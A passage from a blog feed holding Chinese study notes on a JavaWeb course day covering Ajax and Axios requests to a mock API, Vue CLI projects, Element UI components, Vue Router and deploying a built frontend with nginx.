<p><a href="https://heuqqdmbyk.feishu.cn/docx/CzYOdkWfyoh74AxPR4UcHjbxnIc">Day02-作业</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day03--Vue-Element</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day03--Vue-Element/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></p>
</li>
<li>
<p>需要记录的内容的标准：</p>
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>
<p>按照期末考前的笔记选择标准来记：</p>
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>
<p>努力克服完美强迫症</p>
</li>
<li>
<p><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></p>
</li>
<li>
<p><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></p>
</li>
</ul>
<h2 id="Day03-Vue-Element"><a class="header-anchor" href="#Day03-Vue-Element">¶</a>Day03-Vue-Element</h2>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/FqzUd6xnho7yDUx2ZTkcdTISnEb">‌⁠‬‌‌﻿‍⁠‍‬‬‍⁠‍‌⁠﻿‬‍⁠⁠‌‌﻿﻿﻿Day03-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="Ajax"><a class="header-anchor" href="#Ajax">¶</a>Ajax</h3>
<ul>
<li>
<p>即异步的JavaScript和XML</p>
<ul>
<li>与服务器进行数据交互</li>
<li>异步交互：可以在<strong>不重新加载整个页面</strong>的情况下，与服务器交换数据并<strong>更新部分网页</strong>的技术</li>
</ul>
</li>
<li>
<p>同步异步</p>
</li>
<li>
<p>原生Ajax</p>
<ul>
<li>客户端的Ajax请求
<ul>
<li>1.在VS Code中创建Ajax文件夹</li>
<li>2.创建XMLHttpRequest对象，用于和服务器交换数据，也是原生Ajax请求的核心对象</li>
<li>3.调用对象的open()方法设置请求的参数信息，例如请求地址，请求方式</li>
<li>4.通过绑定事件的方式，来获取服务器响应的数据</li>
<li>5.通过浏览器打开页面，请求点击按钮，发送Ajax请求，显示结果</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Axios"><a class="header-anchor" href="#Axios">¶</a>Axios</h3>
<ul>
<li>是简单的发送Ajax请求的技术</li>
<li>对原生的AJAX进行封装，简化书写</li>
<li>Axios官网：<code>https://www.axios-http.cn</code></li>
</ul>
<h4 id="Axios基本使用-1-3-1"><a class="header-anchor" href="#Axios基本使用-1-3-1">¶</a>Axios基本使用   1.3.1</h4>
<ul>
<li>
<p>1.引入Axios文件</p>
</li>
<li>
<p>2.使用Axios发送请求，并获取响应结果</p>
<ul>
<li>官方提供很多api</li>
<li>其中两种：
<ul>
<li>get请求     将请求参数拼接到路径的后面</li>
<li>post请求</li>
</ul>
</li>
</ul>
</li>
<li>
<p>axios()是用来发送异步请求的，小括号中使用 js的JSON对象传递请求相关的参数</p>
</li>
</ul>
<h4 id="Axios快速入门"><a class="header-anchor" href="#Axios快速入门">¶</a>Axios快速入门</h4>
<h5 id="后端实现"><a class="header-anchor" href="#后端实现">¶</a>后端实现</h5>
<ul>
<li>查询所有员工信息服务器地址：<a href="http://yapi.smart-xwork.cn/mock/169327/emp/list">http://yapi.smart-xwork.cn/mock/169327/emp/list</a></li>
<li>根据员工id删除员工信息服务器地址：<a href="http://yapi.smart-xwork.cn/mock/169327/emp/deleteById">http://yapi.smart-xwork.cn/mock/169327/emp/deleteById</a></li>
</ul>
<h5 id="前端实现"><a class="header-anchor" href="#前端实现">¶</a>前端实现</h5>
<ul>
<li>
<p>创建js文件夹，与html同级，然后将axios所依赖的js拷贝到js目录下</p>
</li>
<li>
<p>在html中引入axios所依赖的js文件，并提供两个按钮绑定单击事件，分别用于点击时发送ajax请求</p>
</li>
<li>
<p>分别使用axios的方法发送完整的get请求和post请求</p>
</li>
<li>
<p><code>get请求代码</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过axios发送异步请求-get</span></span><br><span class="line"> <span class="title function_">axios</span>(&#123;</span><br><span class="line">     <span class="attr">method</span>: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">     <span class="attr">url</span>: <span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;</span></span><br><span class="line"> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>post请求</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过axios发送异步请求-post</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">       <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">       <span class="attr">url</span>: <span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;</span>,</span><br><span class="line">       <span class="attr">data</span>: <span class="string">&quot;id=1&quot;</span></span><br><span class="line">   &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>打开浏览器，f12抓包，点击按钮后查看控制台效果</p>
</li>
</ul>
<h4 id="请求方法的别名"><a class="header-anchor" href="#请求方法的别名">¶</a>请求方法的别名</h4>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>axios.get(url [, config])</td>
<td>发送get请求</td>
</tr>
<tr>
<td>axios.delete(url [, config])</td>
<td>发送delete请求</td>
</tr>
<tr>
<td>axios.post(url [, data[, config]])</td>
<td>发送post请求</td>
</tr>
<tr>
<td>axios.put(url [, data[, config]])</td>
<td>发送put请求</td>
</tr>
</tbody>
</table>
<ul>
<li>
<pre><code class="language-javascript">// get请求的两种写法  

//通过axios发送异步请求-get
axios(&#123;
       method: &quot;get&quot;,
       url: &quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;
   &#125;).then(result =&gt; &#123;
       console.log(result.data);
&#125;)

axios.get(&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;).then(result =&gt; &#123;
    console.log(result.data);
&#125;)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```javascript</span><br><span class="line">  // post请求的两种写法</span><br><span class="line">  </span><br><span class="line">  //通过axios发送异步请求-post</span><br><span class="line">  axios(&#123;</span><br><span class="line">         method: &quot;post&quot;,</span><br><span class="line">         url: &quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;,</span><br><span class="line">         data: &quot;id=1&quot;</span><br><span class="line">     &#125;).then(result =&gt; &#123;</span><br><span class="line">         console.log(result.data);</span><br><span class="line">  &#125;)</span><br><span class="line">  </span><br><span class="line">  axios.post(&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;,&quot;id=1&quot;).then(result =&gt; &#123;</span><br><span class="line">      console.log(result.data);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<h4 id="案例"><a class="header-anchor" href="#案例">¶</a>案例</h4>
<ul>
<li>需求：
<ul>
<li>基于Vue及Axios完成数据的动态加载展示</li>
</ul>
</li>
<li>步骤
<ol>
<li>首先创建文件，提前准备基础代码，包括表格以及vue.js和axios.js文件的引入</li>
<li>我们需要在vue的mounted钩子函数中发送ajax请求，获取数据</li>
<li>拿到数据，数据需要绑定给vue的data属性</li>
<li>在tr标签上通过v-for指令遍历数据，展示数据</li>
</ol>
</li>
<li>具体步骤略</li>
</ul>
<h3 id="前后台分离开发"><a class="header-anchor" href="#前后台分离开发">¶</a>前后台分离开发</h3>
<h4 id="前后台分离开发介绍"><a class="header-anchor" href="#前后台分离开发介绍">¶</a>前后台分离开发介绍</h4>
<ul>
<li><strong><u>接口文档</u></strong>：后台开发者根据产品经理提供的产品原型和需求文档所撰写的</li>
<li><strong><u>流程</u></strong>：【需求分析】→【接口定义（API接口文档）】→【前后端并行开发（遵守规范】→【测试（前端、后端）】→前后端联调测试
<ol>
<li>需求分析：阅读需求文档，分析、理解需求</li>
<li>接口定义：查询接口文档中关于需求的接口的定义，包括地址，参数，响应数据类型等等</li>
<li>前后台并行开发：各自按照接口文档进行开发，实现需求</li>
<li>测试：前后台开发完毕，各自按照接口文档进行测试</li>
<li>前后段联调测试：前端工程请求后端工程，测试功能</li>
</ol>
</li>
</ul>
<h4 id="YAPI"><a class="header-anchor" href="#YAPI">¶</a>YAPI</h4>
<h5 id="YAPI介绍"><a class="header-anchor" href="#YAPI介绍">¶</a>YAPI介绍</h5>
<ul>
<li>官网地址：<a href="https://yapi.pro/#">YApi Pro-高效、易用、功能强大的可视化接口管理平台</a></li>
<li>主要提供2个功能：
<ul>
<li>API接口管理：根据需求撰写接口，包括接口的地址，参数，响应等等信息</li>
<li>Mock服务：模拟真实接口，生成接口的模拟测试数据，用于前端的测试</li>
</ul>
</li>
</ul>
<h5 id="接口文档管理"><a class="header-anchor" href="#接口文档管理">¶</a>接口文档管理</h5>
<ul>
<li>个人空间，选择项目列表→添加测试项目</li>
<li>点击进入创建的项目，先添加接口的分类</li>
<li>选择当前创建的分类，创建接口信息</li>
<li>来到接口的编辑界面，对接口做生层次的定制。例如：接口的参数，接口的返回值等</li>
<li>添加接口的请求参数</li>
<li>来到返回数据设置，选择导入json，编写和添加json格式的返回值</li>
<li>保存上述设置后，来到接口预览界面，查询接口的信息</li>
<li>最后，还可以设置接口的mock信息</li>
<li>完成后来到接口的预览界面，点击Mock地址，发现浏览器可以直接打开并返回前面设置的期望数据</li>
</ul>
<h3 id="前端工程化"><a class="header-anchor" href="#前端工程化">¶</a>前端工程化</h3>
<h4 id="前端工程化的特点"><a class="header-anchor" href="#前端工程化的特点">¶</a>前端工程化的特点</h4>
<ul>
<li>
<p>模块化：将js和css等，做成一个个可复用模块</p>
</li>
<li>
<p>组件化：我们将UI组件，css样式，js行为封装成一个个的组件，便于管理</p>
</li>
<li>
<p>规范化：我们提供一套标准的规范的目录接口和编码规范，所有开发人员遵循这套规范</p>
</li>
<li>
<p>自动化：项目的构建，测试，部署全部都是自动完成</p>
</li>
<li>
<p>即：在企业级的前端项目开发中，把前端开发所需要的工具、技术、流程、经验进行规范化和标准化</p>
</li>
<li>
<p>↓↓↓vue官方提供的脚手架→完成前端的工程化</p>
</li>
</ul>
<h4 id="前端工程化入门"><a class="header-anchor" href="#前端工程化入门">¶</a>前端工程化入门</h4>
<h5 id="环境准备"><a class="header-anchor" href="#环境准备">¶</a>环境准备</h5>
<ul>
<li>使用：vue官方使用的脚手架Vue-cli
<ul>
<li>Vue-cli提供功能：
<ol>
<li>统一的目录结构</li>
<li>本地调试</li>
<li>热部署</li>
<li>单元测试</li>
<li>集成打包上线</li>
</ol>
</li>
<li>需要的依赖：NodeJS</li>
</ul>
</li>
</ul>
<h5 id="Vue项目简介"><a class="header-anchor" href="#Vue项目简介">¶</a>Vue项目简介</h5>
<h6 id="2种方式创建vue项目"><a class="header-anchor" href="#2种方式创建vue项目">¶</a>2种方式创建vue项目</h6>
<ul>
<li>
<p>命令行：直接通过命令创建vue项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue create vue-project01</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>图形化界面：先通过命令进入图形化界面，然后再进行vue工程的创建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue ui</span><br></pre></td></tr></table></figure>
<ul>
<li>感觉这个方式更直观。</li>
</ul>
</li>
</ul>
<h6 id="vue项目目录结构"><a class="header-anchor" href="#vue项目目录结构">¶</a>vue项目目录结构</h6>
<table>
<thead>
<tr>
<th>Vue-project01</th>
<th></th>
<th></th>
<th>src</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>node_modules</td>
<td>整个项目的依赖包</td>
<td></td>
<td>assets</td>
<td>静态资源</td>
</tr>
<tr>
<td>public</td>
<td>存放项目的静态文件</td>
<td></td>
<td>components</td>
<td>可重用的组件</td>
</tr>
<tr>
<td>src</td>
<td>存放项目的源代码❤❤❤❤❤（平时开发位置）</td>
<td></td>
<td>router</td>
<td>路由配置</td>
</tr>
<tr>
<td>.gitignore</td>
<td></td>
<td></td>
<td>views</td>
<td>视图组件（页面）</td>
</tr>
<tr>
<td>babel.config.js</td>
<td></td>
<td></td>
<td>App.vue</td>
<td>入口页面（根组件）</td>
</tr>
<tr>
<td>jsconfig.json</td>
<td></td>
<td></td>
<td>main.js</td>
<td>入口js文件</td>
</tr>
<tr>
<td>package-lock.json</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>package.json</td>
<td>模块基本信息，项目开发所需要模块，版本信息</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="http://README.md">README.md</a></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>vue.config.js</td>
<td>保存vue配置的文件，如：代理、端口的配置</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h6 id="运行vue项目"><a class="header-anchor" href="#运行vue项目">¶</a>运行vue项目</h6>
<ul>
<li>
<p>第一种：通过VS Code的图形化界面</p>
<ul>
<li>
<p>左栏工具栏→NPM脚本→点击▷运行→查看终端→访问localhost:port</p>
</li>
<li>
<p>此时访问的是<code>src/App.vue</code>这个根组件</p>
</li>
<li>
<p>对<code>App.vue</code>中的内容进行更改，通过vue项目的热更新，可以直接显示改后内容</p>
</li>
<li>
<p>修改端口：在<code>vue.config.js</code>中添加内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>:&#123;</span><br><span class="line">    <span class="attr">port</span>:<span class="number">7000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>第二种：命令行方式</p>
<ul>
<li>基于cmd窗口，在vue目录下，输入<code>npm run serve</code></li>
</ul>
</li>
<li>
<p>补充：将NPM脚本窗口调试出来</p>
<ol>
<li>VS Code→左下角设置</li>
<li>用户→扩展→Npm</li>
<li>Npm→Auto Detect：on</li>
<li>Enable Run From Folder ：√</li>
<li>重启VS Code→双击package.json→点击<strong>资源管理器处的3个小点</strong>，<strong>勾选npm脚本选项</strong></li>
<li>即能够显示NPM脚本小窗口</li>
</ol>
</li>
</ul>
<h5 id="Vue项目开发流程"><a class="header-anchor" href="#Vue项目开发流程">¶</a>Vue项目开发流程</h5>
<ul>
<li>
<p><code>public/index.html</code></p>
<ul>
<li>
<p>对于vue项目，<code>index.html</code>默认引入了入口函数<code>main.js</code>文件</p>
</li>
<li>
<p>在<code>src/main.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<pre><code>import: 【导入】指定文件，并且【重新起名】。例如上述代码import App from './App.vue'导入当前目录下得App.vue并且起名为App
new Vue(): 创建vue对象
$mount('#app');将vue对象创建的dom对象挂载到id=app的这个标签区域中，作用和之前学习的vue对象的le属性一致。
router:  路由，详细在后面的小节讲解
render: 主要使用视图的渲染的。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 总结：`main.js`中通过代码**挂载**到`index.html`的`ip=app`的标签区域</span><br><span class="line"></span><br><span class="line">- 重点：render中的APP</span><br><span class="line"></span><br><span class="line">  - `render: h =&gt; h(App)`</span><br><span class="line"></span><br><span class="line">- 以`.vue`结尾的都是vue组件，包含三个部分：</span><br><span class="line"></span><br><span class="line">  - `template`：模板部分，主要是HTML代码，用来展示页面主体结构的</span><br><span class="line">  - `script`: js代码区域，主要是通过js代码来控制模板的数据来源和行为的</span><br><span class="line">  - `style`: css样式部分，主要通过css样式控制模板的页面效果得</span><br><span class="line"></span><br><span class="line">### Vue组件库Element</span><br><span class="line"></span><br><span class="line">#### Element介绍</span><br><span class="line"></span><br><span class="line">- `MVVM`中→vue侧重于`VM`开发</span><br><span class="line">- `ElementUI`→侧重于`V`开发，用来开发美观页面</span><br><span class="line">- `Element`→一套基于Vue的网站组件库，用于快速构建网页</span><br><span class="line">  - `Element`提供了很多组成网页的部件，例如：超链接、图片、表格等</span><br><span class="line">  - 学`Element`的好处：便利后端开发者，只需要学会如何从`ElementUI`官网拷贝组件到自己页面并略作修改</span><br><span class="line">- [Element官网](https://element.eleme.cn/#/zh-CN)</span><br><span class="line"></span><br><span class="line">#### Element快速入门</span><br><span class="line"></span><br><span class="line">- 安装ElementUI的组件库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>选中项目并右击<br>
“在集成终端中打开”<br>
来到终端，输入命令↓</p>
<p>npm install element-ui@2.15.3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 在`main.js`这个入口js文件中引入`ElementUI`的组件库</span><br><span class="line"></span><br><span class="line">  ```js</span><br><span class="line">  // 在原有代码中添加如下部分</span><br><span class="line">  </span><br><span class="line">  import ElementUI from &#x27;element-ui&#x27;;</span><br><span class="line">  import &#x27;element-ui/lib/theme-chalk/index.css&#x27;;</span><br><span class="line">  </span><br><span class="line">  Vue.use(ElementUI);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>按照vue项目的开发规范，在<strong>src/views</strong>目录下创建一个vue组件文件</p>
<ul>
<li>注意组件名称后缀是.vue，并且在组件文件中编写之前介绍过的基本组件语法【模板、脚本、样式】</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>ElementUI</code>的官网，找到组件库，选择对应组件并复制代码即可</p>
</li>
<li>
<p>在默认访问的根组件<strong>src/App.vue</strong>中引入自定义的组件</p>
</li>
</ul>
<h4 id="Element组件"><a class="header-anchor" href="#Element组件">¶</a>Element组件</h4>
<h5 id="Table表格"><a class="header-anchor" href="#Table表格">¶</a>Table表格</h5>
<ul>
<li>【注意】：组件包括了3个部分，如果官方有除了template部分之外的style和script都需要复制</li>
</ul>
<h6 id="Table组件属性详解"><a class="header-anchor" href="#Table组件属性详解">¶</a>Table组件属性详解</h6>
<ul>
<li>ElementUI将数据模型绑定到视图：
<ul>
<li>data: 主要定义table组件的数据模型</li>
<li>prop: 定义列的数据应该绑定data中定义的具体的数据模型</li>
<li>label: 定义列的标题</li>
<li>width: 定义列的宽度</li>
</ul>
</li>
<li>Element组件的所有属性都可以在组件页面最下方找到</li>
</ul>
<h5 id="Pagination分页"><a class="header-anchor" href="#Pagination分页">¶</a>Pagination分页</h5>
<ul>
<li>分页组件，主要通过提供分页工具条相关功能</li>
</ul>
<h6 id="Pagination组件属性详解"><a class="header-anchor" href="#Pagination组件属性详解">¶</a>Pagination组件属性详解</h6>
<ul>
<li>background: 添加背景颜色</li>
<li>layout: 分页工具条的布局，其具体值包含<code>sizes</code>, <code>prev</code>, <code>pager</code>, <code>next</code>, <code>jumper</code>, <code>-&gt;</code>, <code>total</code>, <code>slot</code> 这些值</li>
<li>total: 数据的总数量</li>
</ul>
<h6 id="Pagination组件事件详解"><a class="header-anchor" href="#Pagination组件事件详解">¶</a>Pagination组件事件详解</h6>
<ul>
<li>
<p>size-change ： pageSize 改变时会触发</p>
</li>
<li>
<p>current-change ：currentPage 改变时会触发</p>
</li>
<li>
<p>注意：在script代码复制时，methods属性和data同级</p>
</li>
</ul>
<h5 id="Dialog对话框"><a class="header-anchor" href="#Dialog对话框">¶</a>Dialog对话框</h5>
<ul>
<li>Dialog：在保留当前页面状态的情况下，告知用户并承载相关操作</li>
</ul>
<h6 id="Dialog组件属性详解"><a class="header-anchor" href="#Dialog组件属性详解">¶</a>Dialog组件属性详解</h6>
<ul>
<li>
<p>visible.sync ：是否显示 Dialog</p>
</li>
<li>
<pre><code class="language-HTML">在data中声明新的变量dialogFormVisible来控制对话框的隐藏与显示 

dialogFormVisible: false,
</code></pre>
</li>
</ul>
<h3 id="案例-v2"><a class="header-anchor" href="#案例-v2">¶</a>案例</h3>
<ul>
<li>员工管理界面</li>
</ul>
<h4 id="需求说明"><a class="header-anchor" href="#需求说明">¶</a>需求说明</h4>
<ul>
<li>制作类似格式的页面
<ul>
<li>上面是标题栏，左侧栏是搜索栏，右侧是数据展示区域</li>
<li>右侧：需要搜索表单</li>
<li>右侧表格数据为动态展示，数据来自后台</li>
</ul>
</li>
</ul>
<h4 id="案例分析"><a class="header-anchor" href="#案例分析">¶</a>案例分析</h4>
<ul>
<li>
<p>原则：先整体，后局部细节</p>
</li>
<li>
<p>主要步骤：</p>
<ul>
<li>创建页面，完成页面的整体布局规划</li>
<li>然后分别针对3个部分进行各自组件的具体实现</li>
<li>针对于右侧核心内容展示区域，需要使用异步加载数据，以表格渲染数据</li>
</ul>
</li>
</ul>
<h4 id="代码实现-4-4-3"><a class="header-anchor" href="#代码实现-4-4-3">¶</a>代码实现  4.4.3</h4>
<ul>
<li>在做Day03任务的时候可以复现一下hhhh</li>
<li>包含部分：
<ul>
<li>环境搭建</li>
<li>整体布局</li>
<li>顶部标题</li>
<li>左侧导航栏</li>
<li>右侧核心内容：【表格、表单、分页工具栏】</li>
<li>异步数据加载</li>
</ul>
</li>
</ul>
<h5 id="异步数据加载"><a class="header-anchor" href="#异步数据加载">¶</a>异步数据加载</h5>
<ul>
<li>使用axios发送ajax请求</li>
<li>在vue项目中使用axios：
<ul>
<li>安装axios：<code>npm install axios</code></li>
<li>使用axios：<code>import axios from 'axios'</code></li>
<li>发送axios请求的时间：页面加载完成，自动加载数据</li>
<li>可以使用：mounted钩子函数   4.4.3.6.1</li>
</ul>
</li>
</ul>
<h3 id="Vue路由"><a class="header-anchor" href="#Vue路由">¶</a>Vue路由</h3>
<h4 id="路由介绍"><a class="header-anchor" href="#路由介绍">¶</a>路由介绍</h4>
<ul>
<li>点击页面不同功能界面，浏览器的地址栏会发生变化，路由自动更新显示与<code>url</code>所对应的vue组件</li>
<li>Vue官方提供了<code>路由插件Vue Router</code>，主要组成：
<ul>
<li><code>VueRouter</code>：路由器类，根据路由请求在路由视图中动态渲染选中的组件</li>
<li><code>router-link</code>：请求链接组件，浏览器会解析成a</li>
<li><code>router-view</code>：动态视图组件，用来渲染展示与路由路径对应的组件</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td>路由链接组件router-link</td>
<td><router-link to="/emp">员工管理</router-link></td>
</tr>
<tr>
<td>/user : UserView.vue</td>
<td></td>
<td>←路由请求——</td>
<td></td>
<td></td>
</tr>
<tr>
<td>/emp : EmpView.vue</td>
<td>路由器VueRouter</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>/order : OrderView.vue</td>
<td>路由表</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>——更新→</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>路由展示组件router-view</td>
<td><router-view></router-view></td>
</tr>
</tbody>
</table>
<ul>
<li>VueRouter根据配置的url的hash片段和路由的组件关系去维护一张路由表</li>
<li>页面提供一个router-link组件，用户点击，发出路由请求</li>
<li>接着VueRouter根据路由请求，在路由表中找到对应的vue组件</li>
<li>最后VueRouter会切换router-view中的组件，从而进行视图的更新</li>
</ul>
<h4 id="路由入门"><a class="header-anchor" href="#路由入门">¶</a>路由入门</h4>
<ul>
<li>
<p>安装vue-router插件：<code>npm install vue-router@3.5.1</code></p>
</li>
<li>
<p>然后在<code>src/router/index.js</code>文件中定义路由表，根据其提供的模板代码进行修改</p>
</li>
<li>
<p>在<code>main.js</code>中，引入router功能：<code>import router from './router'</code></p>
</li>
<li>
<p>修改页面，将按钮标签换为<router-link></router-link></p>
</li>
<li>
<p>然后再内容展示区域<code>App.vue</code>中定义<code>router-view</code>，作为组件的切换</p>
</li>
<li>
<p>在路由中配置<code>/</code>对应的路由组件</p>
</li>
</ul>
<h3 id="打包部署"><a class="header-anchor" href="#打包部署">¶</a>打包部署</h3>
<ul>
<li>主要分为两步：【前端工程打包】【通过nginx服务器发布前端工程】</li>
</ul>
<h4 id="前端工程打包"><a class="header-anchor" href="#前端工程打包">¶</a>前端工程打包</h4>
<ul>
<li>直接通过VS Code的NPM脚本中提供的build按钮来完成</li>
<li>然后会在工程目录下生成一个dist目录，用于存放需要发布的前端资源</li>
</ul>
<h4 id="部署前端工程"><a class="header-anchor" href="#部署前端工程">¶</a>部署前端工程</h4>
<h5 id="nginx介绍"><a class="header-anchor" href="#nginx介绍">¶</a>nginx介绍</h5>
<ul>
<li>一款轻量级的Web服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器</li>
<li>在Windows的安装：直接解压到无中文目录</li>
</ul>
<table>
<thead>
<tr>
<th>nginx目录结构</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>conf</td>
<td>配置文件目录</td>
</tr>
<tr>
<td>contrib</td>
<td></td>
</tr>
<tr>
<td>docs</td>
<td></td>
</tr>
<tr>
<td>html</td>
<td>静态资源文件目录</td>
</tr>
<tr>
<td>logs</td>
<td>日志文件目录</td>
</tr>
<tr>
<td>temp</td>
<td>临时文件目录</td>
</tr>
<tr>
<td>nginx.exe</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>发布则将资源放入到html目录</li>
</ul>
<h5 id="部署"><a class="header-anchor" href="#部署">¶</a>部署</h5>
<ul>
<li>
<p>将之前打包的前端工程<code>vue/vue-rpoject/dist</code>目录下的内容拷贝到nginx的html目录下</p>
</li>
<li>
<p>双击<code>nginx,exe</code>启动<code>nginx</code></p>
</li>
<li>
<p>nginx服务器的端口号是80，启动成功后浏览器访问<a href="http://localhost:80">http://localhost:80</a>，80端口可省略</p>
</li>
<li>
<p>访问成功，前端工程发布成功</p>
</li>
<li>
<p>注：如果80端口被占用，修改<code>conf/nginx.conf</code>配置文件来修改端口号</p>
</li>
</ul>
<h3 id="Day03-作业"><a class="header-anchor" href="#Day03-作业">¶</a>Day03-作业</h3>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/FqzUd6xnho7yDUx2ZTkcdTISnEb">‌⁠‬‌‌﻿‍⁠‍‬‬‍⁠‍‌⁠﻿‬‍⁠⁠‌‌﻿﻿﻿Day03-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day05--SpringBootWeb请求响应</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day05--SpringBootWeb%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
